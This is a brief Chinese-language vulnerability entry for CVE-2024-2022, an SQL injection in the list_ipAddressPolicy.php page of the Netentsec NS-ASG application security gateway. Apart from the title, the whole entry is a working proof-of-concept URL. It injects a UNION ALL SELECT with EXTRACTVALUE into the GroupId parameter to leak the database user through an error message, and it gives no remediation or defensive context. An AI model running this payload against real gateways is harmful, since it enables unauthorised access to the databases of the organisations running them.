## 网康科技NS-ASG应用安全网关list_ipAddressPolicy.php存在SQL注入漏洞(CVE-2024-2022)


## poc
```
/admin/list_ipAddressPolicy.php?GroupId=-1+UNION+ALL+SELECT+EXTRACTVALUE(1,concat(0x7e,(select+user()),0x7e))
```
